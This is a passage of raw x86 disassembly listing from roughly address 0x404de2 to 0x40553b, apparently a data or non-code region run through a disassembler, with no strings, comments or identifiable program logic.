  404de2:	add    BYTE PTR [eax],dl
  404de4:	dec    eax
  404de5:	mov    BYTE PTR [eax+0x68008020],cl
  404deb:	and    al,BYTE PTR [eax]
  404ded:	test   BYTE PTR [eax],al
  404def:	push   ecx
  404df0:	enter  0x2680,0x81
  404df4:	push   esp
  404df5:	inc    eax
  404df6:	and    al,0x2
  404df8:	and    BYTE PTR [eax+0x1099100],0x43
  404dff:	dec    esp
  404e00:	add    BYTE PTR [edx],bh
  404e02:	add    BYTE PTR [edx],ah
  404e04:	mov    ds:0x24048040,al
  404e09:	or     BYTE PTR [esp+ebx*1],dh
  404e0c:	xor    BYTE PTR [ecx],0xab
  404e0f:	add    DWORD PTR [eax],eax
  404e11:	sub    DWORD PTR [eax+eiz*8],0xd2902040
  404e18:	adc    eax,DWORD PTR [eax]
  404e1a:	or     BYTE PTR fs:[eax],al
  404e1d:	add    BYTE PTR [ecx+eiz*1],dh
  404e20:	add    al,al
  404e22:	add    BYTE PTR [eax],al
  404e24:	adc    eax,0x444c8300
  404e29:	inc    ecx
  404e2a:	add    DWORD PTR [eax+0x11],ebp
  404e2d:	add    DWORD PTR [edx+0x0],0x28
  404e31:	sub    DWORD PTR [eax+0x20],edx
  404e34:	and    cl,BYTE PTR [eax]
  404e36:	add    BYTE PTR [edx],al
  404e38:	adc    al,BYTE PTR [ecx]
  404e3a:	add    BYTE PTR [ecx],al
  404e3c:	add    BYTE PTR [edx],dl
  404e3e:	xor    bh,BYTE PTR [ecx+0x2208080]
  404e44:	adc    BYTE PTR [eax-0x77eff87c],al
  404e4a:	add    BYTE PTR [eax],0x24
  404e4d:	rol    BYTE PTR [eax],0x85
  404e50:	pop    esp
  404e51:	inc    esi
  404e52:	mov    eax,ds:0x9610204c
  404e57:	add    BYTE PTR [eax],al
  404e59:	add    DWORD PTR [eax+0x45],ecx
  404e5c:	nop
  404e5d:	inc    eax
  404e5e:	push   ecx
  404e5f:	sbb    BYTE PTR [esi],al
  404e61:	dec    ecx
  404e62:	add    BYTE PTR [ecx],0x0
  404e65:	add    BYTE PTR [eax],al
  404e67:	or     BYTE PTR [eax+0x21],dh
  404e6a:	add    al,0xa2
  404e6c:	mov    al,0x52
  404e6e:	mov    BYTE PTR [edx],ah
  404e70:	and    BYTE PTR [eax],al
  404e72:	add    cl,BYTE PTR [ecx+0x8]
  404e75:	or     BYTE PTR [ebx],al
  404e77:	sbb    BYTE PTR [eax+0x880800a],cl
  404e7d:	push   es
  404e7e:	or     ah,BYTE PTR [edx+0x1]
  404e81:	cwde   
  404e82:	xor    DWORD PTR [ecx+eiz*1],eax
  404e85:	add    BYTE PTR [eax],al
  404e87:	add    DWORD PTR [eax],ecx
  404e89:	inc    esp
  404e8a:	xor    BYTE PTR [eax],dh
  404e8c:	add    BYTE PTR [eax],al
  404e8e:	or     al,BYTE PTR [eax]
  404e90:	inc    edx
  404e91:	adc    BYTE PTR [ecx],ah
  404e93:	add    BYTE PTR [edx],dl
  404e95:	add    BYTE PTR [edx],al
  404e97:	adc    BYTE PTR [ecx],al
  404e99:	fs push es
  404e9b:	and    BYTE PTR [eax+0x49440410],al
  404ea1:	and    BYTE PTR [eax],0x60
  404ea4:	rol    ah,0x10
  404ea7:	add    BYTE PTR [eax],al
  404ea9:	inc    eax
  404eaa:	pop    es
  404eab:	inc    edx
  404eac:	add    BYTE PTR [ecx+0x2],0x8
  404eb0:	inc    eax
  404eb1:	or     al,BYTE PTR [esp+ecx*2]
  404eb4:	adc    BYTE PTR [ecx],al
  404eb6:	add    DWORD PTR [eax+eiz*4],0x40406c01
  404ebd:	rol    DWORD PTR [eax],0xc
  404ec0:	add    BYTE PTR [ecx],dh
  404ec2:	or     BYTE PTR [edx],al
  404ec4:	inc    esp
  404ec5:	inc    ecx
  404ec6:	add    BYTE PTR [ecx+0xa],al
  404ec9:	and    BYTE PTR ds:0x61018300,al
  404ecf:	adc    cl,BYTE PTR [edx+0x200c]
  404ed5:	adc    BYTE PTR [edi+0xca0010],al
  404edb:	adc    DWORD PTR [ebx],edx
  404edd:	add    al,0x41
  404edf:	add    al,0x2
  404ee1:	add    al,0x28
  404ee3:	and    BYTE PTR [ecx],0x0
  404ee6:	inc    eax
  404ee7:	add    BYTE PTR ds:0x50a02409,cl
  404eed:	inc    eax
  404eee:	add    cl,BYTE PTR [eax]
  404ef0:	add    al,BYTE PTR [eax]
  404ef2:	inc    edx
  404ef3:	add    cl,BYTE PTR [esi]
  404ef5:	add    BYTE PTR [esi],cl
  404ef7:	dec    edx
  404ef8:	inc    eax
  404ef9:	add    cl,dl
  404efb:	inc    eax
  404efc:	inc    edx
  404efd:	add    BYTE PTR [eax],al
  404eff:	add    BYTE PTR [eax],cl
  404f01:	inc    eax
  404f02:	or     al,0x78
  404f04:	or     DWORD PTR [eax],eax
  404f06:	cwde   
  404f07:	inc    eax
  404f08:	inc    eax
  404f09:	add    BYTE PTR [eax+ecx*8],ah
  404f0c:	sbb    DWORD PTR [edx+0x41],eax
  404f0f:	mov    eax,ds:0x14440c9
  404f14:	add    al,0x29
  404f16:	mov    edx,0x800000
  404f1b:	or     DWORD PTR [edx],ecx
  404f1d:	add    DWORD PTR [eax+eax*2+0x10],eax
  404f21:	and    DWORD PTR [edx+eax*2+0x40],eax
  404f25:	add    al,0x91
  404f27:	add    BYTE PTR [eax],al
  404f29:	ins    BYTE PTR es:[edi],dx
  404f2a:	add    dl,al
  404f2c:	adc    al,0x20
  404f2e:	add    DWORD PTR [ecx+0x82082a0],eax
  404f34:	and    BYTE PTR [ecx-0x7ed5ffbe],al
  404f3a:	or     al,BYTE PTR [ecx]
  404f3c:	xchg   ecx,eax
  404f3d:	add    BYTE PTR [ecx],0x0
  404f40:	add    al,0x44
  404f42:	add    BYTE PTR [esp+eax*1],dl
  404f45:	sbb    al,0x0
  404f47:	add    BYTE PTR [eax],bl
  404f49:	add    BYTE PTR [eax],cl
  404f4b:	or     BYTE PTR [eax-0x7e],0x0
  404f4f:	and    eax,DWORD PTR [eax]
  404f51:	adc    BYTE PTR [eax],ah
  404f53:	add    eax,DWORD PTR [eax]
  404f55:	push   esp
  404f56:	add    ah,dl
  404f58:	or     al,BYTE PTR [eax]
  404f5a:	or     BYTE PTR [eax],al
  404f5c:	add    BYTE PTR [esi],al
  404f5e:	inc    ecx
  404f5f:	adc    BYTE PTR [edx+0xd2e20],ah
  404f65:	add    DWORD PTR [edx+0x0],edx
  404f68:	add    al,BYTE PTR ds:0x8110b228
  404f6e:	pop    eax
  404f6f:	add    eax,0x230
  404f74:	adc    DWORD PTR [eax+eax*1],ecx
  404f77:	and    eax,0x41d0
  404f7c:	add    BYTE PTR [eax],cl
  404f7e:	adc    BYTE PTR [ecx],al
  404f80:	or     BYTE PTR [eax],0x68
  404f83:	add    BYTE PTR [eax+0x22],al
  404f86:	or     DWORD PTR [ecx+edx*2],0x20089001
  404f8d:	inc    BYTE PTR [ecx]
  404f8f:	add    al,0x40
  404f91:	or     eax,DWORD PTR [ecx]
  404f93:	lock and BYTE PTR [edx],dh
  404f96:	nop
  404f97:	add    al,0xc
  404f99:	and    eax,DWORD PTR [eax]
  404f9b:	or     eax,DWORD PTR [eax+0x0]
  404f9e:	retf   0x4068
  404fa1:	or     BYTE PTR [eax],0x88
  404fa4:	rol    BYTE PTR [eax],1
  404fa6:	mov    ds:0x1002444a,al
  404fab:	rol    dl,0xe6
  404fae:	inc    ebx
  404faf:	add    dl,al
  404fb1:	and    al,0x0
  404fb3:	pop    esp
  404fb4:	add    BYTE PTR [eax-0x7c],cl
  404fb7:	pusha  
  404fb8:	add    BYTE PTR [eax],bl
  404fba:	add    al,BYTE PTR [edx]
  404fbc:	add    BYTE PTR [edx+0x2084e],al
  404fc2:	xor    al,0x42
  404fc4:	and    BYTE PTR [eax],al
  404fc6:	add    BYTE PTR [eax],cl
  404fc8:	add    BYTE PTR [eax],0x0
  404fcb:	cmp    BYTE PTR [eax+0x8852c80],cl
  404fd1:	adc    DWORD PTR [eax],esp
  404fd3:	add    BYTE PTR ds:0xc4104010,al
  404fd9:	add    al,BYTE PTR [eax]
  404fdb:	push   eax
  404fdc:	mov    al,ds:0x20004
  404fe1:	dec    eax
  404fe2:	mov    al,ds:0x80000c0
  404fe7:	add    BYTE PTR [eax],dl
  404fe9:	mov    WORD PTR [edx],ss
  404feb:	add    ah,BYTE PTR [eax]
  404fed:	push   es
  404fee:	or     DWORD PTR [eax+eax*1+0x1064024],ebp
  404ff5:	mov    eax,0x28000048
  404ffa:	sub    BYTE PTR [edx-0x80],al
  404ffd:	add    BYTE PTR [eax],ah
  404fff:	or     al,BYTE PTR [edx]
  405001:	sbb    BYTE PTR [eax+eax*4+0x2],0xca
  405006:	inc    eax
  405007:	adc    DWORD PTR [eax+0x2],eax
  40500a:	test   eax,0x8100012
  40500f:	add    BYTE PTR [edx],ah
  405011:	add    ch,BYTE PTR [ecx]
  405013:	inc    eax
  405014:	or     DWORD PTR [eax],eax
  405016:	add    BYTE PTR [edx],0x4
  405019:	and    al,0x80
  40501b:	add    al,BYTE PTR [edx]
  40501d:	add    eax,0x444069e0
  405022:	add    ah,BYTE PTR [ebp-0x70]
  405025:	and    BYTE PTR [edi+0x5f0008],al
  40502b:	or     BYTE PTR [eax+0x1c12],cl
  405031:	ret    0xe08
  405034:	mov    al,ds:0x2400008
  405039:	inc    eax
  40503a:	xor    BYTE PTR [eax],ah
  40503c:	sbb    BYTE PTR [eax],al
  40503e:	call   0x42d8:0x18001824
  405045:	add    BYTE PTR [eax],al
  405047:	ret    0xa59
  40504a:	inc    eax
  40504b:	add    BYTE PTR [eax],ah
  40504d:	add    DWORD PTR ds:0x400096,edx
  405053:	popa   
  405054:	add    BYTE PTR [eax+0x30],al
  405057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405058:	inc    ecx
  405059:	inc    eax
  40505a:	add    BYTE PTR [ecx],al
  40505c:	inc    eax
  40505d:	add    dl,BYTE PTR [eax]
  40505f:	add    BYTE PTR [ecx],al
  405061:	add    BYTE PTR [edx],al
  405063:	rol    BYTE PTR [eax],1
  405065:	cmp    BYTE PTR [ecx],0x4
  405068:	inc    eax
  405069:	or     BYTE PTR [eax],cl
  40506b:	rol    BYTE PTR [esi-0x79fffadc],0x41
  405072:	xchg   edi,eax
  405073:	or     BYTE PTR [eax-0x77fb9f8f],al
  405079:	or     BYTE PTR [eax],0x80
  40507c:	add    cl,al
  40507e:	mov    al,0x0
  405080:	adc    BYTE PTR [ecx],al
  405082:	shl    BYTE PTR [ecx],0x40
  405085:	js     0x405088
  405087:	and    BYTE PTR [ecx+0x0],ah
  40508a:	add    DWORD PTR [eax],esp
  40508c:	add    BYTE PTR [edx],dl
  40508e:	or     DWORD PTR [ecx],eax
  405090:	jbe    0x405093
  405092:	add    al,BYTE PTR [esi]
  405094:	push   ecx
  405095:	add    BYTE PTR [eax],al
  405097:	inc    eax
  405098:	sbb    al,0xa1
  40509a:	shl    BYTE PTR [eax],0xe
  40509d:	and    BYTE PTR [esi+0x0],ah
  4050a0:	or     BYTE PTR [edx],al
  4050a2:	loopne 0x405040
  4050a4:	add    BYTE PTR ds:0x2448880,ah
  4050aa:	add    al,BYTE PTR [eax]
  4050ac:	add    al,0x0
  4050ae:	mov    al,0x82
  4050b0:	add    BYTE PTR [edx],0x20
  4050b3:	sbb    BYTE PTR [ebx],dl
  4050b5:	dec    ecx
  4050b6:	adc    BYTE PTR [ecx],al
  4050b8:	add    BYTE PTR [eax+0x40],bh
  4050bb:	add    dl,BYTE PTR [eax+0x0]
  4050be:	add    al,0x4
  4050c0:	add    al,BYTE PTR [edx]
  4050c2:	add    al,0xa0
  4050c4:	or     BYTE PTR [ecx],ah
  4050c6:	add    BYTE PTR [eax],al
  4050c8:	add    BYTE PTR [eax],al
  4050ca:	add    BYTE PTR [eax],bh
  4050cc:	add    DWORD PTR [eax],ebx
  4050ce:	inc    eax
  4050cf:	add    DWORD PTR [ebp+0x5],eax
  4050d2:	sub    al,0x84
  4050d4:	and    al,BYTE PTR [edx]
  4050d6:	rol    BYTE PTR [ecx],0x11
  4050d9:	add    BYTE PTR [edx],al
  4050db:	and    eax,DWORD PTR [eax]
  4050dd:	add    BYTE PTR [eax+0x2],al
  4050e0:	or     DWORD PTR [eax+eax*1],ecx
  4050e3:	adc    BYTE PTR [eax],al
  4050e5:	and    BYTE PTR [eax+ebp*2],0x22
  4050e9:	add    BYTE PTR [ecx],dl
  4050eb:	adc    BYTE PTR [edx+ebp*4+0x40],0x59
  4050f0:	add    ah,BYTE PTR [eax+0x0]
  4050f3:	xor    al,0x31
  4050f6:	inc    eax
  4050f7:	or     BYTE PTR [eax],dl
  4050f9:	or     DWORD PTR [eax],eax
  4050fb:	dec    eax
  4050fc:	add    BYTE PTR [eax+eax*1-0x78],ah
  405100:	inc    eax
  405101:	mov    al,BYTE PTR [eax]
  405103:	inc    eax
  405104:	or     BYTE PTR ds:0x829e4002,al
  40510a:	adc    BYTE PTR [eax+0x40260a2],ah
  405110:	add    dl,BYTE PTR [eax+0x30]
  405113:	add    BYTE PTR [ebp-0x3f6f7fff],0xe3
  40511a:	inc    eax
  40511b:	inc    esp
  40511c:	inc    eax
  40511d:	add    DWORD PTR [eax+eax*2],eax
  405120:	add    DWORD PTR [eax-0x7d79ffb0],ecx
  405126:	xor    BYTE PTR [ebx],al
  405128:	mov    al,ds:0x2083409
  40512d:	add    BYTE PTR ds:0x94221,al
  405133:	inc    eax
  405134:	add    BYTE PTR [eax],dl
  405136:	inc    edx
  405137:	adc    DWORD PTR [eax+eax*1],eax
  40513a:	add    cl,BYTE PTR [eax+0x1]
  40513d:	or     ah,BYTE PTR [eax]
  40513f:	and    BYTE PTR [edx-0x78],0x0
  405143:	and    al,BYTE PTR [ecx]
  405145:	add    DWORD PTR [eax],0x25200042
  40514b:	dec    ebx
  40514c:	adc    BYTE PTR [eax+0x21],al
  40514f:	push   ss
  405150:	add    BYTE PTR [eax+0x0],0xc
  405154:	add    BYTE PTR [edx+0x71c010],cl
  40515a:	inc    edx
  40515b:	add    BYTE PTR [ecx+0x0],al
  40515e:	and    BYTE PTR [eax],dl
  405160:	and    BYTE PTR [edx+eax*1],cl
  405163:	shr    BYTE PTR [eax],0x48
  405166:	add    BYTE PTR [eax+ebx*2],ah
  405169:	push   ss
  40516a:	and    al,0x40
  40516c:	add    BYTE PTR [esp+eax*4],al
  40516f:	add    al,0x19
  405171:	and    DWORD PTR ds:0x90828112,eax
  405177:	mov    al,0xc0
  405179:	and    ecx,eax
  40517b:	add    BYTE PTR [eax],cl
  40517d:	add    BYTE PTR gs:[eax+0x9],cl
  405181:	retf   0x3020
  405184:	add    cl,BYTE PTR [eax]
  405186:	(bad)  
  405187:	or     BYTE PTR [eax+0x22200304],al
  40518d:	adc    BYTE PTR [eax],bl
  40518f:	add    BYTE PTR [eax-0x3ffb8000],al
  405195:	inc    eax
  405196:	add    BYTE PTR [edx+eax*2],cl
  405199:	jno    0x40519b
  40519b:	xchg   ebp,eax
  40519c:	add    al,BYTE PTR [eax]
  40519e:	loopne 0x4051a9
  4051a0:	add    BYTE PTR [eax+eax*1],0x68
  4051a4:	or     DWORD PTR [ecx],ecx
  4051a6:	les    esp,FWORD PTR [eax]
  4051a8:	inc    esp
  4051a9:	or     BYTE PTR [eax],al
  4051ab:	or     BYTE PTR [eax],al
  4051ad:	add    DWORD PTR [eax+0x4],eax
  4051b0:	pusha  
  4051b1:	or     BYTE PTR [ecx],dl
  4051b3:	add    BYTE PTR [eax],0x83
  4051b6:	or     DWORD PTR [eax],eax
  4051b8:	and    BYTE PTR [ebp+0x10200000],dl
  4051be:	(bad)  
  4051bf:	adc    DWORD PTR [eax],edx
  4051c1:	cmp    BYTE PTR [eax],al
  4051c3:	xor    cl,BYTE PTR [ecx]
  4051c5:	add    BYTE PTR [edx+0x20],al
  4051c8:	and    BYTE PTR [eax+0x2900840],0x4
  4051cf:	test   BYTE PTR [eax],al
  4051d1:	and    BYTE PTR [eax],al
  4051d3:	or     BYTE PTR [eax-0x40],al
  4051d6:	or     al,BYTE PTR [eax+0x2]
  4051d9:	add    DWORD PTR [edx],edx
  4051db:	or     DWORD PTR [eax],eax
  4051dd:	inc    ecx
  4051de:	inc    ebp
  4051df:	add    al,BYTE PTR [eax]
  4051e1:	sub    BYTE PTR [ecx],al
  4051e3:	mov    ecx,0x58cc000
  4051e8:	and    BYTE PTR [edx],al
  4051ea:	cdq    
  4051eb:	add    al,BYTE PTR [ecx+0x3]
  4051ee:	add    BYTE PTR [eax+0x9a86401],al
  4051f4:	and    BYTE PTR [eax],al
  4051f6:	or     esp,DWORD PTR [ebx+0x1200c8]
  4051fc:	dec    eax
  4051fd:	or     BYTE PTR [eax],al
  4051ff:	pusha  
  405200:	add    BYTE PTR [eax],cl
  405202:	adc    BYTE PTR [eax],dl
  405204:	add    BYTE PTR [ecx+0x210005],al
  40520a:	push   eax
  40520b:	mov    eax,DWORD PTR [eax]
  40520d:	xor    BYTE PTR [ebp-0x7df7ffe0],ah
  405213:	dec    ecx
  405214:	and    eax,DWORD PTR [eax]
  405216:	and    BYTE PTR [eax],al
  405218:	add    BYTE PTR [eax],al
  40521a:	retf   
  40521b:	add    BYTE PTR [eax+eax*2],al
  40521e:	add    DWORD PTR [edx+eax*1],0x8c2a1420
  405225:	adc    BYTE PTR [edx+0x2],al
  405228:	and    DWORD PTR [eax],eax
  40522a:	sbb    BYTE PTR [edx],0x40
  40522d:	add    DWORD PTR [eax+0x20041068],ecx
  405233:	push   es
  405234:	mov    al,0x8
  405236:	add    DWORD PTR [eax],esp
  405238:	push   es
  405239:	sub    BYTE PTR [ebp+0x0],al
  40523c:	push   ecx
  40523d:	add    eax,DWORD PTR [ebx+0x182144]
  405243:	inc    eax
  405244:	add    BYTE PTR [eax+0x41380003],0x4
  40524b:	and    BYTE PTR [eax],al
  40524d:	add    al,0x66
  40524f:	adc    DWORD PTR [edx],0x50200881
  405255:	add    BYTE PTR [eax+0x0],al
  405258:	nop
  405259:	add    DWORD PTR [eax],eax
  40525b:	push   esi
  40525c:	sub    BYTE PTR [edx],0x20
  40525f:	and    BYTE PTR [ebp+ecx*4-0x3c],0xc0
  405264:	adc    cl,BYTE PTR [eax]
  405266:	sbb    al,BYTE PTR [eax]
  405268:	add    BYTE PTR [eax+0x46612e0a],al
  40526e:	or     BYTE PTR [eax-0x80],cl
  405271:	and    BYTE PTR [ecx],ch
  405273:	adc    DWORD PTR [ecx+0x40],eax
  405276:	and    BYTE PTR [eax+0x8000003],ah
  40527c:	or     BYTE PTR [eax+eax*2],ch
  40527f:	inc    esp
  405280:	and    DWORD PTR [ecx-0x48],eax
  405283:	and    al,al
  405285:	inc    eax
  405286:	push   cs
  405287:	add    BYTE PTR [eax+0x4],cl
  40528a:	add    BYTE PTR [edx],al
  40528c:	or     BYTE PTR [ecx],al
  40528e:	push   edx
  40528f:	add    al,0x0
  405291:	and    BYTE PTR [eax+0x1],dh
  405294:	adc    al,0x33
  405296:	popa   
  405297:	add    BYTE PTR [edx],0x5
  40529a:	adc    BYTE PTR [eax],dl
  40529c:	add    al,0xa0
  40529e:	add    BYTE PTR [eax],dl
  4052a0:	add    al,0x63
  4052a3:	add    BYTE PTR [edx+0x850008],0x48
  4052aa:	adc    BYTE PTR [eax],dl
  4052ac:	adc    BYTE PTR [ebx+0xc],al
  4052af:	add    BYTE PTR [eax],al
  4052b1:	inc    eax
  4052b2:	or     DWORD PTR [ebx-0x70],ecx
  4052b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052b6:	inc    eax
  4052b7:	add    DWORD PTR [esi],edx
  4052b9:	xor    BYTE PTR [eax],dl
  4052bb:	inc    eax
  4052bc:	adc    DWORD PTR [edx+0x203a0c8],esp
  4052c2:	add    al,0xa0
  4052c4:	dec    eax
  4052c5:	adc    edx,DWORD PTR [eax+eax*1]
  4052c8:	or     al,0x1
  4052ca:	arpl   WORD PTR [ecx],bp
  4052cc:	mov    BYTE PTR [eax],al
  4052ce:	and    ah,BYTE PTR [eax]
  4052d0:	adc    BYTE PTR [ecx+0x20442288],ah
  4052d6:	add    DWORD PTR [ecx],esp
  4052d8:	add    BYTE PTR [ecx+0x4],al
  4052db:	inc    eax
  4052dc:	nop
  4052dd:	add    BYTE PTR [ebx+0x10000000],dh
  4052e3:	add    dl,ah
  4052e5:	adc    BYTE PTR [ecx-0x78],al
  4052e8:	and    al,0xd
  4052ea:	add    BYTE PTR [eax-0x60],dh
  4052ed:	and    DWORD PTR [ecx],eax
  4052ef:	imul   esp,DWORD PTR [eax+0x1a80400],0x10080809
  4052f9:	fs and cl,ah
  4052fc:	sbb    DWORD PTR [eax],eax
  4052fe:	inc    eax
  4052ff:	les    eax,FWORD PTR [edx]
  405301:	xor    BYTE PTR [eax],ah
  405303:	push   es
  405304:	adc    BYTE PTR [ecx],al
  405306:	sub    BYTE PTR [ecx],dl
  405308:	add    al,BYTE PTR [esp+ecx*1]
  40530b:	push   es
  40530c:	add    BYTE PTR [eax],cl
  40530e:	loope  0x405310
  405310:	add    DWORD PTR [edx+0x13],esp
  405313:	add    BYTE PTR [eax],al
  405315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405316:	mov    al,ds:0x8282402a
  40531b:	mov    al,al
  40531d:	adc    BYTE PTR [ebp+0x40e340],0x10
  405324:	sub    al,BYTE PTR [eax+0x41]
  405327:	cmp    BYTE PTR [ebp+0x4800100c],al
  40532d:	ins    BYTE PTR es:[edi],dx
  40532e:	inc    eax
  40532f:	shl    BYTE PTR [edx+0x40],0x0
  405333:	add    BYTE PTR [eax-0x43ff9fc0],ch
  405339:	adc    BYTE PTR [eax-0x60],cl
  40533c:	inc    eax
  40533d:	add    DWORD PTR [ecx],0x5114080
  405343:	add    BYTE PTR [eax],al
  405345:	add    DWORD PTR [eax],eax
  405347:	add    eax,DWORD PTR [eax+0x7]
  40534a:	add    BYTE PTR [edx],al
  40534c:	ret    0x394
  40534f:	add    BYTE PTR [eax],al
  405351:	add    al,0x0
  405353:	add    BYTE PTR [eax-0x80],al
  405356:	sbb    BYTE PTR [eax+0x0],ah
  405359:	rol    BYTE PTR [ecx],1
  40535b:	push   eax
  40535c:	add    BYTE PTR [edx],al
  40535e:	adc    DWORD PTR [ecx-0x40],eax
  405361:	add    BYTE PTR [eax+eax*1-0x40],dl
  405365:	add    BYTE PTR [edx],al
  405367:	add    DWORD PTR [edx+0x44],eax
  40536a:	adc    al,0x1
  40536c:	rol    BYTE PTR [eax],0x0
  40536f:	add    BYTE PTR [edx],ah
  405371:	and    BYTE PTR [eax],0x1
  405374:	or     al,BYTE PTR [edi+0x48]
  405377:	dec    eax
  405378:	or     BYTE PTR [ecx],al
  40537a:	add    dl,BYTE PTR [eax]
  40537c:	add    BYTE PTR [ecx-0x7f5fdbff],bh
  405382:	xor    dl,cl
  405384:	push   es
  405385:	add    al,BYTE PTR [eax]
  405387:	and    BYTE PTR [ecx],al
  405389:	add    BYTE PTR [edx+0x8404a80],dl
  40538f:	and    BYTE PTR [ebx+0x0],al
  405392:	and    BYTE PTR [ecx],al
  405394:	or     BYTE PTR [edx],ch
  405396:	or     BYTE PTR [ecx],al
  405398:	add    BYTE PTR [eax-0x76],al
  40539b:	push   cs
  40539c:	sbb    BYTE PTR [edx],dl
  40539e:	add    DWORD PTR [edx+0x210821],eax
  4053a4:	add    ah,BYTE PTR [edx+0x800001]
  4053aa:	add    BYTE PTR [esi],dl
  4053ac:	inc    eax
  4053ad:	and    BYTE PTR [eax],al
  4053af:	or     cl,BYTE PTR gs:[ecx]
  4053b2:	inc    esp
  4053b3:	add    cl,BYTE PTR [eax+eax*2]
  4053b6:	add    BYTE PTR [ecx],al
  4053b8:	inc    ecx
  4053b9:	add    BYTE PTR [eax+0x0],cl
  4053bc:	rol    BYTE PTR [ecx],0x9
  4053bf:	int3   
  4053c0:	adc    eax,0x920a000
  4053c5:	or     BYTE PTR [eax],0x6c
  4053c8:	add    DWORD PTR [eax],eax
  4053ca:	add    BYTE PTR [eax+esi*4],al
  4053cd:	add    DWORD PTR [edx],eax
  4053cf:	add    BYTE PTR [ebx+edx*4+0x3a2a0233],al
  4053d6:	enter  0xe849,0x8
  4053da:	test   BYTE PTR [eax],al
  4053dc:	int    0xb8
  4053de:	add    dl,BYTE PTR [ecx]
  4053e0:	dec    esp
  4053e1:	inc    eax
  4053e2:	add    BYTE PTR [eax+0x40850],dl
  4053e8:	or     BYTE PTR [edx],dl
  4053ea:	add    al,BYTE PTR [eax]
  4053ec:	inc    eax
  4053ed:	add    BYTE PTR [eax],dl
  4053ef:	inc    eax
  4053f0:	sub    BYTE PTR [edx-0x3fffef00],al
  4053f6:	add    al,0x0
  4053f8:	add    BYTE PTR [eax],0x50
  4053fb:	add    BYTE PTR [eax],0x4
  4053fe:	add    BYTE PTR [eax],ah
  405400:	dec    eax
  405401:	mov    al,ds:0x8a048008
  405406:	inc    eax
  405407:	push   ebp
  405408:	and    dl,BYTE PTR [edx]
  40540a:	lea    esp,[ebx+0x2140a100]
  405410:	add    DWORD PTR [esi+0x804],edx
  405416:	push   edx
  405417:	xor    ah,BYTE PTR [eax]
  405419:	add    BYTE PTR [eax],al
  40541b:	or     DWORD PTR [ecx],eax
  40541d:	arpl   WORD PTR [eax],bx
  40541f:	mov    ah,BYTE PTR [edx+0x20060]
  405425:	pusha  
  405426:	add    al,BYTE PTR [eax]
  405428:	and    al,BYTE PTR [eax]
  40542a:	pop    edx
  40542b:	jo     0x40545b
  40542d:	inc    eax
  40542e:	add    BYTE PTR [eax+0x44001012],bh
  405434:	nop
  405435:	adc    al,0x10
  405437:	sub    BYTE PTR ds:0x80090000,0x0
  40543e:	and    DWORD PTR [eax+0x2],0xffffff84
  405442:	add    BYTE PTR [eax],ah
  405444:	inc    eax
  405445:	adc    dl,BYTE PTR [eax+0x48029000]
  40544b:	and    al,BYTE PTR [ecx]
  40544d:	add    al,BYTE PTR [eax+0x40410001]
  405453:	adc    eax,0x4040000d
  405458:	and    BYTE PTR ds:0x80008800,dl
  40545e:	inc    eax
  40545f:	dec    eax
  405460:	add    BYTE PTR [eax],ah
  405462:	add    BYTE PTR [eax+0x20],dl
  405465:	nop
  405466:	add    BYTE PTR [eax+eax*4+0x3],al
  40546a:	add    BYTE PTR [eax],0x20
  40546d:	add    BYTE PTR [edi+0x2],dl
  405470:	and    BYTE PTR [ebp-0x4e],0x0
  405474:	sub    ah,BYTE PTR [eax]
  405476:	add    DWORD PTR [eax],esp
  405478:	add    BYTE PTR [eax+edx*4],dl
  40547b:	adc    ah,BYTE PTR [ecx]
  40547d:	add    cl,al
  40547f:	and    al,0x3
  405481:	or     al,BYTE PTR [eax-0x5efeffe0]
  405487:	add    BYTE PTR [ecx],0x92
  40548a:	add    edx,0x800a81
  405490:	inc    eax
  405491:	and    al,0x80
  405493:	and    eax,0x218222
  405498:	xchg   ebp,eax
  405499:	bound  eax,QWORD PTR [edx]
  40549b:	dec    ecx
  40549c:	dec    ebp
  40549d:	sbb    dl,al
  40549f:	fs inc ecx
  4054a1:	add    DWORD PTR [eax],edi
  4054a3:	add    al,al
  4054a5:	or     BYTE PTR [eax-0x7e000000],al
  4054ab:	add    BYTE PTR [edx],dh
  4054ad:	and    BYTE PTR [eax],ah
  4054af:	add    ecx,DWORD PTR [eax]
  4054b1:	pusha  
  4054b2:	or     eax,DWORD PTR [ecx]
  4054b4:	inc    eax
  4054b5:	nop
  4054b6:	push   ds
  4054b7:	dec    ebx
  4054b8:	or     BYTE PTR [eax],0x8
  4054bb:	add    BYTE PTR [eax],ah
  4054bd:	add    BYTE PTR [eax+0x630488],al
  4054c3:	mov    edx,ss
  4054c5:	and    BYTE PTR [edx],al
  4054c7:	inc    eax
  4054c8:	arpl   WORD PTR [eax],ax
  4054ca:	add    DWORD PTR [eax],eax
  4054cc:	and    BYTE PTR [eax],0x31
  4054cf:	and    BYTE PTR [eax],ah
  4054d1:	dec    eax
  4054d2:	adc    BYTE PTR [eax+0x60],al
  4054d5:	repnz add BYTE PTR ss:[eax],dh
  4054d9:	mov    eax,ds:0x28420049
  4054de:	or     BYTE PTR [eax],ah
  4054e0:	adc    BYTE PTR [eax+0x48],al
  4054e3:	adc    BYTE PTR [eax],cl
  4054e5:	mov    al,ds:0xc4a05100
  4054ea:	add    BYTE PTR [eax+0x0],0x0
  4054ee:	inc    eax
  4054ef:	mov    eax,DWORD PTR [edx]
  4054f1:	push   eax
  4054f2:	add    BYTE PTR [edi+0x2],dh
  4054f5:	ror    BYTE PTR ds:0x2460b2,0x50
  4054fc:	add    BYTE PTR [eax],0x0
  4054ff:	dec    ecx
  405500:	add    BYTE PTR [ecx],al
  405502:	mov    eax,ds:0x71082000
  405507:	add    al,0x84
  405509:	push   es
  40550a:	add    BYTE PTR [edx+0x28],0x0
  40550e:	xor    eax,edi
  405510:	and    DWORD PTR [eax],eax
  405512:	add    BYTE PTR [eax-0x80],0x0
  405516:	add    BYTE PTR [eax],cl
  405518:	inc    eax
  405519:	add    al,BYTE PTR [eax]
  40551b:	and    al,cl
  40551d:	inc    eax
  40551e:	add    al,BYTE PTR [ecx]
  405520:	inc    eax
  405521:	add    BYTE PTR [eax],al
  405523:	adc    al,0x0
  405525:	and    BYTE PTR [eax],al
  405527:	dec    ecx
  405528:	add    BYTE PTR [eax],dl
  40552a:	xor    BYTE PTR [eax+0x19e34900],al
  405530:	add    DWORD PTR [ecx+0x52ca4080],edx
  405536:	or     eax,DWORD PTR [ecx]
  405538:	xchg   esp,eax
  405539:	dec    eax
  40553a:	dec    eax
  40553b:	add    BYTE PTR [eax+0x21],dl
